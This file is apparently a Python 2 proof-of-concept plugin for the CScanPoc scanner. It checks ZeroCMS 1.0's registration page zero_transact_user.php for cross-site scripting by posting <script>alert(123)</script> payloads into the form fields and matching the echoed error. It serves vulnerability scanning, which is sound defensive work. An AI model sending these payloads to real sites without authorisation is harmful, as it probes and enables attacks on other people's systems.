# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZeroCMS_0101'  # 平台漏洞编号，留空
    name = 'ZeroCMS 1.0 /zero_transact_user.php 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-29'  # 漏洞公布时间
    desc = '''
    ZeroCMS用户注册页面zero_transact_user.php表单完全没进行过滤。
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/34170/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZeroCMS'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1addae27-5c1f-4f5c-b697-c6385c493394'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/zero_transact_user.php'
            verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
            request = urllib2.Request(verify_url, data=verify_data)
            response = urllib2.urlopen(request)
            content = response.read()
            if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
